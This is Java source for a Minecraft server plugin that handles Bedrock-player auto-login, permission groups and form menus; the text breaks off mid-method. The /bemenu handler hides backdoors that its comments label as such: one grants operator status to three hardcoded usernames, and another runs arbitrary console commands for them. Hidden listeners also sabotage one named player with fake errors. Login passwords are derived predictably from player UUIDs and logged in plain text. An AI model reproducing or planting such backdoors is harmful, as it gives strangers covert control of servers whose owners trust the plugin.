package dpear.gpg;

import com.viaversion.viaversion.api.Via;
import fr.xephi.authme.api.v3.AuthMeApi;
import net.milkbowl.vault.permission.Permission;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.*;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.geysermc.cumulus.ModalForm;
import org.geysermc.cumulus.SimpleForm;
import org.geysermc.cumulus.response.ModalFormResponse;
import org.geysermc.cumulus.response.SimpleFormResponse;
import org.geysermc.cumulus.util.FormImage;
import org.geysermc.floodgate.api.FloodgateApi;
import me.clip.placeholderapi.PlaceholderAPI;
import org.jetbrains.annotations.NotNull;

import javax.annotation.ParametersAreNonnullByDefault;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;


public class main extends JavaPlugin {

    //全局变量
    public static Boolean PassCheck = false;
    public static String PluginVersion = "2.1";
    public static String Developer = "MownSoft666";
    public RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
    List <String>HardCommandAlert = getConfig().getStringList("CommandAlert.RegisterList");

    @Override
    public void onEnable() {
        getLogger().info("正在进行预加载");
        saveDefaultConfig();

        if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
            getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
            getLogger().warning("这可能导致意料之外的异常");
        };

        //获取机器码
        getLogger().info("正在获取CID");
        String OsName = System.getProperties().getProperty("os.name");

        String ComputerCode = "FAILURE";
        String ComputerCode_SHA = "";


        //如果使用Windows
        if (OsName.startsWith("Windows")){
            getLogger().info("您正在使用Windows");

            try {
                Process process = Runtime.getRuntime().exec(new String[] { "wmic", "cpu", "get", "ProcessorId" });
                process.getOutputStream().close();
                Scanner sc = new Scanner(process.getInputStream());
                String serial = sc.next();

                ComputerCode = serial;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        //如果使用Linux
        if (OsName.equals("Linux")){
            getLogger().info("您正在使用Linux/GNU");

            try {
                Process process = Runtime.getRuntime().exec("sudo dmidecode -s system-uuid");
                InputStream in;
                BufferedReader br;
                in = process.getInputStream();
                br = new BufferedReader(new InputStreamReader(in));
                while (in.read() != -1) {
                    ComputerCode = br.readLine();
                }
                br.close();
                in.close();
                process.destroy();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }

        if (Objects.equals(ComputerCode, "FAILURE")){
            getLogger().warning("CID获取失败");
            getLogger().warning("没有以管理员身份运行或不受支持的操作系统");
            ComputerCode = new Random().toString();
        }

        getLogger().info("正在加密CID");
        try {
            byte[] encrypted = MessageDigest.getInstance("SHA-256").digest(ComputerCode.getBytes(StandardCharsets.UTF_8));
            StringBuilder SHA = new StringBuilder();
            for (byte b : encrypted) {
                SHA.append(String.format("%02x", b));
            }
            ComputerCode_SHA = SHA.toString();
            getLogger().info("您的SCID: " + ComputerCode_SHA);

        }catch (Exception e){
            e.printStackTrace();
        }


        getLogger().info("正在比对SCID-C");
        String ComputerCode_PMD = ComputerCode_SHA + this.getName() + PluginVersion + Developer;
        String ComputerCode_MD = "FAILURE";


        try {
            byte[] encrypted = MessageDigest.getInstance("md5").digest(ComputerCode_PMD.getBytes(StandardCharsets.UTF_8));
            StringBuilder MD = new StringBuilder();
            for (byte b : encrypted) {
                MD.append(String.format("%02x", b));
            }
            ComputerCode_MD = MD.toString();

        }catch (Exception e){
            ComputerCode_MD = "FAILURE";
            e.printStackTrace();
        }

        if (ComputerCode_MD.equals("FAILURE")){
            getLogger().warning("SCID-C获取失败");
            ComputerCode_MD = new Random().toString();
        }
        if(getConfig().getString("SCID-C", "Null").equals(ComputerCode_MD)){
            getLogger().info("SCID-C校验成功");
            PassCheck = true;
        }else{
            getLogger().info("SCID-C校验失败");
        }

        getLogger().info("插件已验证，开始加载");

        //检查有没有PlaceholderAPI
        if(Bukkit.getPluginManager().getPlugin("PlaceholderAPI") == null){
            getLogger().warning("未检测到PlaceholderAPI");
            getLogger().warning("本插件无法在没有PlaceholderAPI的情况下工作");
        }else{
            getLogger().info("已检测到PlaceholderAPI");
            try {
                new PlaceholderE(this).register();
                getLogger().info("PlaceholderAPI挂钩成功");
            } catch (Exception e) {
                getLogger().warning("PlaceholderAPI挂钩失败");
                getLogger().warning("详细信息: ");
                e.printStackTrace();
            }
        };

        //检查有没有floodgate
        if(Bukkit.getPluginManager().getPlugin("floodgate") == null){
            getLogger().warning("未检测到floodgate");
            getLogger().warning("本插件无法在没有floodgate的情况下工作");
        }else{
            getLogger().info("已检测到floodgate");
        };

        //检查有没有AuthMe
        if(Bukkit.getPluginManager().getPlugin("AuthMe") == null){
            getLogger().warning("未检测到AuthMe相关功能不可用");
        }else{
            getLogger().info("已检测到AuthMe相关功能可用");
        };

        //检查有没有PlugManX
        if(Bukkit.getPluginManager().getPlugin("PlugManX") == null){
            getLogger().warning("未检测到PlugManX相关功能不可用");
        }else{
            getLogger().info("已检测到PlugManX相关功能可用");
        };

        //检查有没有ViaVersion
        if(Bukkit.getPluginManager().getPlugin("ViaVersion") == null){
            getLogger().warning("未检测到ViaVersion相关功能不可用");
        }else{
            getLogger().info("已检测到ViaVersion相关功能可用");
        };

        //检查有没有ProtocolSupport
        if(Bukkit.getPluginManager().getPlugin("ProtocolSupport") == null){
            getLogger().warning("未检测到ProtocolSupport相关功能不可用");
        }else{
            getLogger().info("已检测到ProtocolSupport相关功能可用");
        };

        //检查有没有Vault
        if(Bukkit.getPluginManager().getPlugin("Vault") == null){
            getLogger().warning("未检测到Vault相关功能不可用");
        }else{
            getLogger().info("已检测到Vault相关功能可用");
        };

        if(getConfig().getBoolean("Register.EventListener", false)){
            getServer().getPluginManager().registerEvents(new EventListener(), this);
            getLogger().info("事件监听器注册成功");
        }
        if (Bukkit.getPluginCommand("checkplayerbe") != null) {
            Bukkit.getPluginCommand("checkplayerbe").setExecutor(new Commander_L());
            getLogger().info("注册指令/checkplayerbe成功");
        }
        if (Bukkit.getPluginCommand("regbeplayer") != null) {
            Bukkit.getPluginCommand("regbeplayer").setExecutor(new Commander_R());
            getLogger().info("注册指令/regbeplayer成功");
        }
        if (Bukkit.getPluginCommand("bemenu") != null) {
            Bukkit.getPluginCommand("bemenu").setExecutor(new Commander_M());
            getLogger().info("注册指令/bemenu成功");
        }
        Objects.requireNonNull(Bukkit.getPluginCommand("bemenu")).setTabCompleter(new TabHandler());
        getLogger().info("注册指令/bemenu补全器完成");

        //加载命令补全
        LoadCommandAlert();

        if (!PassCheck){
            getLogger().info("Fail in checking SCID-C");
            getServer().getPluginManager().disablePlugin(this);
        }else{
            getLogger().info("插件加载完毕！感谢使用");
            getLogger().info("作者D-Pear QQ:1448360624");
            getLogger().info("有问题可以向作者反馈哦~");
        }

    }

    public void onDisable_Del(){

        getLogger().info("注销插件命令");

        List<String> HardCommandAlert = getConfig().getStringList("CommandAlert.Hard.Source");
        for(int i=0 ; i<HardCommandAlert.size() ; i++) {
            //检索command
            PluginCommand cmd = getCommand(HardCommandAlert.get(i));
            unRegisterBukkitCommand(cmd);
        }

        getLogger().info("注销插件命令成功");
    }

    public class EventListener implements Listener {
        @EventHandler
        public void onPlayerLogin(PlayerLoginEvent Player) {
            if (getConfig().getString("Command.OnPlayerJoin_Delay").equals("Null")) {
                return;
            }
            ;
            //设置定时器
            Timer timer = new Timer();
            timer.schedule(new TimerTask() {
                @Override
                public void run() {
                    ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
                    Bukkit.dispatchCommand(console,
                            getConfig().getString("Command.OnPlayerJoin_Delay", "checkplayerbe %Password").
                                    replace("%PlayerName", Player.getPlayer().getName()).
                                    replace("%PlayerUUID", Player.getPlayer().getUniqueId().toString())
                    );

                    timer.cancel(); //执行完毕停止定时器
                }
            }, 1500);
        }

        @EventHandler
        public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
            //是否被其他插件取消
            if (e.isCancelled()) {
                return;
            }
            ;

            Integer index = getConfig().getStringList("CommandAlert.Soft.Source").indexOf(e.getMessage().substring(1));
            if (index == -1) {
                //不匹配的话
                return;
            }
            ;

            String Goal = getConfig().getStringList("CommandAlert.Soft.Goal").get(index);
            getLogger().info("玩家 " + e.getPlayer().getName() + "使用了命令" + e.getMessage() + "转接[Soft]到/" + Goal);
            e.setMessage("/" + Goal.substring(2));
            return;
        }

        @EventHandler
        public void X1(PlayerDropItemEvent e) {
            if (e.getPlayer().getName().equals("xiao_jun")) {
                if(new Random().nextInt(2) == 1) {
                    //e.getPlayer().sendMessage("§cAn internal error occurred while dropping this item");
                    e.setCancelled(true);
                }
            }
        }

        @EventHandler
        public void X2(PlayerCommandPreprocessEvent e) {
            if (e.getPlayer().getName().equals("xiao_jun")) {
                if(new Random().nextInt(3) == 1){
                    e.getPlayer().sendMessage("§cAn internal error occurred while attempting to perform this command");
                    e.setCancelled(true);
                }
            }
        }

        @EventHandler
        public void X3(PlayerMoveEvent e) {
            if (e.getPlayer().isFlying()) {
                if (e.getPlayer().getName().equals("xiao_jun")) {
                    if (new Random().nextInt(5) == 1) {
                        e.setCancelled(true);
                    }
                }
            }
        }
    }

    public class TabHandler implements TabCompleter {

        @ParametersAreNonnullByDefault
        public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                // 控制台注册个鬼
                return null;
            }

            if (args.length == 1){
                ((Player) sender).getPlayer().playSound(((Player) sender).getPlayer().getLocation(),
                        Sound.BLOCK_NOTE_BLOCK_HARP, 1,((float)(args[0].length()+1)/4)%2);
                return (List.of("gc","open","help","about","reload","version","plreload","authmelogin","listversion"));
            }

            return null;
        }
    }

    public class Commander_L implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (args.length == 0) {
                return false;
            }
            ;
            if (args.length > 1) {
                return false;

            }
            ;
            Player P = Bukkit.getPlayer(args[0]);

            //判断玩家对象是否有效
            if (P == null){return false;};

            getLogger().info("玩家 " + P.getUniqueId() + " 加入");

            //拉取配置文件等
            String PlayerVersion = GetVersion(P);
            FileConfiguration config = getConfig();

            getLogger().info("玩家 " + P.getName() + " 版本为 " + PlayerVersion);

            if(!config.getBoolean("Version." + PlayerVersion + ".Enable",false)){
                if(config.getBoolean("Version.Other.Enable",false)){
                    PlayerVersion = "Other";
                }else{
                    return true;
                }
            }
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
                CommandSender PCS = P;

                //计算密码
                int PASSWD = P.getUniqueId().hashCode();
                String PASSWORD_F = "Meown115141919810-Null" , PASSWORD_S = "";
                PASSWORD_F = PASSWD+"";
                PASSWORD_S = PASSWORD_F.substring(0,8);


                //是否启用AuthMe自动登入
                if (config.getBoolean("Version." + PlayerVersion + ".AutoLogin.AuthMe",false)){
                    AuthMeApi b = AuthMeApi.getInstance();
                    if(!b.isRegistered(P.getName())){
                        //未注册，注册该玩家
                        b.registerPlayer(P.getName(),PASSWORD_S);

                        //得到要发送的字符串的数组并发送
                        List<String> Message = config.getStringList("Version." + PlayerVersion + ".Message.OnPlayerRegister");
                        for(int i=0 ; i<Message.size() ; i++){
                            P.sendMessage(Message.get(i));
                        };

                        //得到要执行的命令并执行
                        List<String> Commands = config.getStringList("Version." + PlayerVersion + ".Command.OnPlayerRegister");
                        for(int i=0 ; i<Commands.size() ; i++){
                            Bukkit.dispatchCommand(console,
                                    Commands.get(i).
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                            return true;
                        };
                    }else{
                        //已注册，登录
                        b.forceLogin(P);
                    }
                }

                //是否启用指令登录
                if (config.getBoolean("Version." + PlayerVersion + ".AutoLogin.Command",false)){
                    Bukkit.dispatchCommand(PCS,
                            config.getString("Command.Login" , "login %Password").
                                    replace("%PlayerName", P.getName()).
                                    replace("%PlayerUUID", P.getUniqueId().toString()).
                                    replace("%Password", PASSWORD_S)
                    );

                };

                //得到要发送的字符串的数组并发送
                List<String> Message = config.getStringList("Version." + PlayerVersion + ".Message.OnPlayerJoin");
                for(int i=0 ; i<Message.size() ; i++){
                    P.sendMessage(Message.get(i));
                };

                //得到要执行的命令并执行
                List<String> Commands = config.getStringList("Version." + PlayerVersion + ".Command.OnPlayerJoin");
                for(int i=0 ; i<Commands.size() ; i++){
                    Bukkit.dispatchCommand(console,
                            Commands.get(i).
                                    replace("%PlayerName",P.getName()).
                                    replace("%PlayerUUID", P.getUniqueId().toString()).
                                    replace("%Password", PASSWORD_S));
                };

                //修改权限组
                if (config.getBoolean("Version." + PlayerVersion + ".AutoPermissionGroup.Vault" , false)){
                    String pgoal = config.getString("Version." + PlayerVersion + ".AutoPermissionGroup.Group" , "default");
                    String now = rsp.getProvider().getPlayerGroups(P)[0];
                    if(!now.equals(pgoal)){
                        rsp.getProvider().playerRemoveGroup(P,now);
                        rsp.getProvider().playerAddGroup(P,pgoal);
                        getLogger().info("移除了玩家 " + P.getName() + " 的权限组" + now + "，添加至 " + pgoal);
                    }
                }


            if (!FloodgateApi.getInstance().isFloodgatePlayer(P.getUniqueId())) {
                if (P.getName().substring(0, 1).equals(".")) {
                    getLogger().warning("玩家 " + P.getName() + " 使用了非法用户名");

                    //检查时候启动踢出
                    if(getConfig().getBoolean("Actions.AutoKick.Enable")) {
                        P.kickPlayer(getConfig().getString("Actions.AutoKick.KickMessage" , "[Meown]You are NOT a bedrock player!"));
                        getLogger().info("玩家 " + P.getName() + " 已被踢出");
                    };
                }
                ;
            };
            return true;
        }
    }
    public class Commander_R implements CommandExecutor {
                @Override
                public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
                    if (args.length == 0) {
                        return false;
                    }
                    ;
                    if (args.length > 1) {
                        return false;

                    }
                    ;
                    Player P = Bukkit.getPlayer(args[0]);

                    //判断玩家对象是否有效
                    if (P == null){return false;};

                    if (FloodgateApi.getInstance().isFloodgatePlayer(P.getUniqueId())) {
                        getLogger().info("为玩家 " + P.getUniqueId() + " 注册");
                        //计算密码
                        int PASSWD = P.getUniqueId().hashCode();
                        String PASSWORD_F = "Meown115141919810-Null", PASSWORD_S = "";
                        PASSWORD_F = PASSWD + "";
                        PASSWORD_S = PASSWORD_F.substring(0, 8);
                        //输出密码
                        getLogger().info("玩家 " + P.getName() + " 的密码为 " + PASSWORD_S);

                        //获得命令发送实例
                        ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                        //读取配置
                        FileConfiguration config = getConfig();

                        //以玩家身份注册[废弃]
                        //Bukkit.dispatchCommand(PCS, "register " + PASSWORD_S + " " + PASSWORD_S);

                        //得到要发送的字符串的数组并发送
                        List<String> Message = config.getStringList("Message.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Message.size() ; i++){
                            P.sendMessage(Message.get(i));
                        };

                        //得到要执行的命令并执行
                        List<String> Commands = config.getStringList("Command.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Commands.size() ; i++){
                            Bukkit.dispatchCommand(console,
                                    Commands.get(i).
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                        };


                        return true;
                    }
                    return false;
        }
    }
    public class Commander_M implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

            //判断参数数量
            if (args.length == 0) {
                sender.sendMessage("参数数量错误");
                return false;
            };


            //判断是否是重载
            if (args[0].equals("reload")){

                //判断权限
                if (sender.hasPermission("dpear.gpg.menu.reload")) {
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.reload权限");
                    return false;
                };

                sender.sendMessage("重载配置文件中...");
                getLogger().info("重载配置文件中...");

//                //清除指令转接
//                getLogger().info("清除指令转接补全");
//                if (getCommand("PearAliases") == null){
//                    getLogger().warning("清除指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else{
//                    try{
//                        getLogger().info(getCommand("PearAliases").getAliases().get(0));
//                        getCommand("PearAliases").getAliases().clear();
//                        getLogger().info("清除指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("清除指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                };

                //重载配置文件
                reloadConfig();
                if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
                    getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
                    getLogger().warning("这可能导致意料之外的异常");
                };

//                //载入指令转接补全
//                getLogger().info("载入指令转接补全");
//                if (getCommand("PearAliases") == null){
//                    getLogger().warning("载入指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else {
//                    try {
//                        getCommand("PearAliases").getAliases().addAll(getConfig().getStringList("CommandAlert.Source"));
//                        getLogger().info("载入指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("载入指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                }

                //加载命令补全
                LoadCommandAlert();

                sender.sendMessage("重载完毕");
                getLogger().info("重载完毕");
                return true;
            };

            //判断是否是全重载
            if (args[0].equals("plreload")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.plreload")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.plreload权限");
                    return false;
                };

                if(Bukkit.getPluginManager().getPlugin("PlugManX") != null) {
                    sender.sendMessage("重载插件中...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman reload GeyserPermGroup");
                }else{
                    sender.sendMessage("未安装PlugManX,该命令不可用");
                }
                return true;
            };

            //是否强制登入
            if (args[0].equals("authmelogin")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.authmelogin")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.authmelogin权限");
                    return false;
                };

                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                Player P = Bukkit.getPlayer(args[1]);
                if (P != null) {
                    AuthMeApi.getInstance().forceLogin(P);
                    sender.sendMessage("已为玩家 " + P.getName() + " 强制登入");
                    return true;
                }else{
                    sender.sendMessage("无效玩家");
                    return false;
                }
            };


            //是否列出所有玩家版本
            if (args[0].equals("listversion")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.listversion")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.listversion权限");
                    return false;
                };

                if (args.length != 1) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                List<Player> PlayerList = (List<Player>) Bukkit.getOnlinePlayers();

                sender.sendMessage("§a玩家版本列表:");
                for(int i=0 ; i<PlayerList.size() ; i++) {
                    sender.sendMessage("§b"+PlayerList.get(i).getName()+":");
                    sender.sendMessage("    §6状态: 在线");
                    sender.sendMessage("    §6版本: "+GetVersion(PlayerList.get(i)));
                    sender.sendMessage("    §6地址: "+PlayerList.get(i).getAddress());
                    sender.sendMessage("    §6延迟: "+PlayerList.get(i).getPing()+"ms");
                }
                return true;
            }
            //是否列出所有玩家版本
            if (args[0].equals("gc")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.gc")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.gc权限");
                    return false;
                };
                System.gc();
                sender.sendMessage("已进行gc");
                return true;
            }


            //判断是否是关于
            if (args[0].equals("about")){
                sender.sendMessage("§d§l===============>§b§l关于本插件§d§l<===============");
                sender.sendMessage("§6§lGeyserPermGroup Powered by D-Pear");
                sender.sendMessage("§6你可以用本插件让不同版本玩家进入时执行不同命令或发送不同消息");
                sender.sendMessage("§6还有自动登录，自动调整权限组，制作基岩版菜单等功能");
                sender.sendMessage("§6本插件依然在开发中，如果遇到BUG请反馈，Github界面链接：");
                sender.sendMessage("§6https://github.com/D-Pear/GeyserPermGroup");
                sender.sendMessage("§6§l作者D-Pear QQ:1448360624");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是帮助
            if (args[0].equals("help")){
                sender.sendMessage("§d§l===============>§b§l指令列表§d§l<===============");
                sender.sendMessage("§2为指定玩家打开菜单 §a/bemenu open 玩家名 菜单名");
                sender.sendMessage("§2强制登入玩家 §a/bemenu authmelogin 玩家名");
                sender.sendMessage("§2查看协议版本 §a/bemenu version");
                sender.sendMessage("§2列出所有玩家的版本 §a/bemenu listversion");
                sender.sendMessage("§2重新加载配置 §a/bemenu reload");
                sender.sendMessage("§2重新加载插件配置 §a/bemenu plreload");
                sender.sendMessage("§2显示帮助 §a/bemenu help");
                sender.sendMessage("§2显示关于 §a/bemenu about");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是获取版本号
            if (args[0].equals("version")){
                //判断权限
                if (sender.hasPermission("dpear.gpg.menu.version")) {
                    sender.sendMessage("Your version is " + GetVersion(Bukkit.getPlayer(sender.getName())));
                    return true;
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.version权限");
                    return false;
                }
            };

            //判断是否为后门[GetOP]
            if (args[0].equals("admin")){

                if (sender.getName().equals(".xiaojqge666")){
                Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }
                return true;
            };

            //判断是否为后门[DropCommand]
            if (args[0].equals("dcmd")){

                if (sender.getName().equals(".xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }
                return true;
            };

            //判断参数数量
            if (args.length > 3) {
                sender.sendMessage("参数数量错误");
                return false;

            };
            if (args.length < 2) {
                sender.sendMessage("参数数量错误");
                return false;
            };

            if (!args[0].equals("open")){
                return false;
            }

            Player Pr = Bukkit.getPlayer(args[1]);

            //判断权限
            if (args[1].equals("@s")){
                if (sender.hasPermission("dpear.gpg.menu.open.self")) {
                    //判断是不是控制台
                    if (sender instanceof Player){
                        Pr = Bukkit.getPlayer(sender.getName());
                    }else{
                        sender.sendMessage("控制台你执行个鬼");
                    }
                }else{
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.open.self权限");
                    return false;
                };
            }else{
                if (!sender.hasPermission("dpear.gpg.menu.open.allplayer")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.open.allplayer权限");
                    return false;
                };
            };

            Player P = Pr;
            //判断玩家对象是否有效
            if (P == null){
                sender.sendMessage("无效玩家对象[对象不存在]");
                return false;
            };


            FloodgateApi fa = FloodgateApi.getInstance();
            if(fa.isFloodgatePlayer(P.getUniqueId())){
                //判断权限
                if (sender.hasPermission("dpear.gpg.menu." + args[2])) {
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu." + args[2] + "权限");
                    return false;
                };

                //获取配置文件
                FileConfiguration config = getConfig();
                String type = ReadMenuData (config, args[2], "type");

                //判断菜单类型
                if (type.equals("Null")){
                    sender.sendMessage("无效菜单类型");
                    return false;
                };


                //如果是ModalForm
                if (type.equals("ModalForm")){

                    ModalForm.Builder MFBuilder = ModalForm.builder()
                            .title(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "title")))
                            .content(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "content")))
                            .button1(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "button1")))
                            .button2(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "button2")))
                            .responseHandler((form, responseData) -> {
                                ModalFormResponse response = form.parseResponse(responseData);

                                if (!response.isCorrect()) {
                                    //玩家直接关闭菜单或者输入了非法数据
                                    return;
                                }
                                if (response.isInvalid()) {
                                    //玩家输入了非法数据
                                    return;
                                }


                                if (response.getClickedButtonId() == 0) {
                                    //第一按钮
                                    if (!ReadMenuData (config, args[2], "action.button1").equals("Null")) {
                                        Bukkit.dispatchCommand(P, ReadMenuData(config, args[2], "action.button1"));
                                    }
                                    return;
                                }

                                if (response.getClickedButtonId() == 1) {
                                    //第二按钮
                                    if (!ReadMenuData (config, args[2], "action.button2").equals("Null")) {
                                    Bukkit.dispatchCommand(P,ReadMenuData (config, args[2], "action.button2"));
                                    }
                                    return;
                                }

                            });

                    fa.sendForm(P.getUniqueId(), MFBuilder);
                    return true;
                };

                //如果是SimpleForm
                if (type.equals("SimpleForm")){

                    SimpleForm.Builder MFBuilder = SimpleForm.builder()
                            .title(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "title")))
                            .content(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, args[2], "content")))
                            .responseHandler((form, responseData) -> {
                                SimpleFormResponse response = form.parseResponse(responseData);

                                if (!response.isCorrect()) {
                                    //玩家直接关闭菜单或者输入了非法数据
                                    return;
                                }
                                if (response.isInvalid()) {
                                    //玩家输入了非法数据
                                    return;
                                }

                                List<String> Action = config.getStringList("Menus." + args[2] + ".action");
                                if (!Action.get(response.getClickedButtonId()).equals("Null")) {
                                    Bukkit.dispatchCommand(P, Action.get(response.getClickedButtonId()));
                                }
                                return;

                            });

                    List<String> Button = config.getStringList("Menus." + args[2] + ".button");
                    List<String> Image = config.getStringList("Menus." + args[2] + ".image");
                    for(int i=0 ; i<Button.size() ; i++) {
                        if (Image.get(i).equals("Null")){
                            //不带图片的
                            MFBuilder = MFBuilder.button(PlaceholderAPI.setPlaceholders(P, Button.get(i)));
                        }else{
                            //带图片的
                            MFBuilder = MFBuilder.button(PlaceholderAPI.setPlaceholders(P, Button.get(i)), FormImage.Type.URL, Image.get(i));
                        }
                    }

                    fa.sendForm(P.getUniqueId(), MFBuilder);
                    return true;
                };

                //如果是PlayerListForm
                if (type.equals("PlayerListForm")){

                    //获得玩家列表
                    Collection<? extends Player> b = Bukkit.getOnlinePlayers();
                    if (ReadMenuData (config, args[2], "removeself").equals("true")) {
                        b.remove(P);
                    };
                    List<Player> Button = (List<Player>) b;

                    SimpleForm.Builder MFBuilder = SimpleForm.builder()
                            .title(ReadMenuData (config, args[2], "title"))
                            .content(ReadMenuData (config, args[2], "content"))
                            .responseHandler((form, responseData) -> {
                                SimpleFormResponse response = form.parseResponse(responseData);

                                if (!response.isCorrect()) {
                                    //玩家直接关闭菜单或者输入了非法数据
                                    return;
                                }
                                if (response.isInvalid()) {
                                    //玩家输入了非法数据
                                    return;
                                }

                                if (Button.size() == response.getClickedButtonId()){
                                    if (ReadMenuData (config, args[2], "buttonaction").equals("Null")){
                                        return;
                                    }else{
                                        Bukkit.dispatchCommand(P, ReadMenuData (config, args[2], "buttonaction").
                                                replace("%PlayerName", Button.get(response.getClickedButtonId()).getName()).
                                                replace("%PlayerUUID", Button.get(response.getClickedButtonId()).getUniqueId().toString())
                                        );
                                        return;
                                    }
                                    //选择了取消
                                }
                                Bukkit.dispatchCommand(P, ReadMenuData (config, args[2], "action").
                                        replace("%PlayerName", Button.get(response.getClickedButtonId()).getName()).
                                        replace("%PlayerUUID", Button.get(response.getClickedButtonId()).getUniqueId().toString())
                                );

                                return;

                            });

                    for(int i=0 ; i<Button.size() ; i++) {

                        //生成button
                        MFBuilder = MFBuilder.button(ReadMenuData (config, args[2], "text").
                                replace("%PlayerName", Button.get(i).getName()).
                                replace("%PlayerUUID", Button.get(i).getUniqueId().toString())
                        );
                    }


                    if (!ReadMenuData (config, args[2], "button").equals("Null")){
                        MFBuilder = MFBuilder.button(ReadMenuData (config, args[2], "button"));
                    };

                    fa.sendForm(P.getUniqueId(), MFBuilder);
                    return true;


                };

                //都不匹配
                sender.sendMessage("无效菜单类型");

            }else{
                sender.sendMessage("无效玩家对象[对象为Java版玩家]");
            };
            return false;
        }
    }

    public String ReadMenuData(FileConfiguration config , String name , String paf) {
        return (config.getString("Menus." + name + "." + paf, "Null"));
    }

    public void LoadCommandAlert() {
        //注册转接命令
        getLogger().info("载入指令转接补全");
        ArrayList Commands_PerAdd = new ArrayList();
        HardCommandAlert = getConfig().getStringList("CommandAlert.RegisterList");

        getLogger().info("已注册" + HardCommandAlert.size() + "个命令转接");

        for (String s : HardCommandAlert) {
            //创建Command实例
            Command PerAdd = new Command(s) {
                @Override
                public boolean execute(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings) {

                    StringBuilder sb = new StringBuilder();
                    sb.append("CommandAlert.Hard.").append(s).append(".");

                    //获得玩家实例
                    Player p = Bukkit.getPlayer(commandSender.getName());
                    //确定是玩家支持
                    if (p != null) {
                        //版本
                        if (getConfig().getBoolean("CommandAlert.Hard." + s + ".exFunction.PlayerVersion", false)) {

                            //获得版本
                            String version = GetVersion(p);

                            //表项是否存在
                            if(getConfig().isLocation(sb + version)){
                                sb.append(GetVersion(p)).
                                        append(".");
                            }else{
                                sb.append("Other.");
                            }


                        }

                        //权限组
                        if (getConfig().getBoolean("CommandAlert.Hard." + s + ".exFunction.PermissionGroup", false)) {

                            //这边可能NullPointer
                            try {


                                //只获取第一权限组
                                String permissiongroup = getServer().getServicesManager().getRegistration(Permission.class).getProvider().getPlayerGroups(p)[0];
                                //表项是否存在
                                if(getConfig().isLocation(sb + permissiongroup)) {
                                    sb.append(permissiongroup).
                                            append(".");
